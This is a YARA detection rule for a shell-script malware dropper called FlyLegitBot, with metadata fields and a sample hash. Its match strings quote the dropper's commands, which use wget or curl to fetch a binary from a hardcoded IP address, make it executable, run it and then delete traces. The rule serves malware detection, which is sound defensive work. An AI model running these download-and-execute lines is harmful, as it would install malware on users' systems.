rule SCRIPT_Dropper_FlyLegitBot_ForgeAuto_96707f44
{
    meta:
        author = "Marjoriefort"
        description = "Detects FlyLegitBot (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "96707f44df308cd81ae0af1cf7381e486c24982cc43af32acb3c02c16bcea77a"
        yarahub_uuid = "d96227b1-ff7d-4c41-a49d-ba0e2ee8c41a"
        famille = "FlyLegitBot"
        famille_source = "reputation"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "60249f6c0fc259e956a175654b4097a3"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "ARCH=$(uname -m)" ascii
        $s1 = "wget -q -O iran.$ARCH http://176.65.139.166:8080/iran.$ARCH 2>/dev/null || \\" ascii
        $s2 = "curl -s -o iran.$ARCH http://176.65.139.166:8080/iran.$ARCH 2>/dev/null" ascii
        $s3 = "chmod +x iran.$ARCH" ascii
        $s4 = "iran.$ARCH telnet" ascii
        $s5 = "rm -f iran.$ARCH cat.sh" ascii
    condition:
        true and filesize < 50MB and 2 of ($s0, $s3, $s4, $s5) and 1 of ($s1, $s2)
}
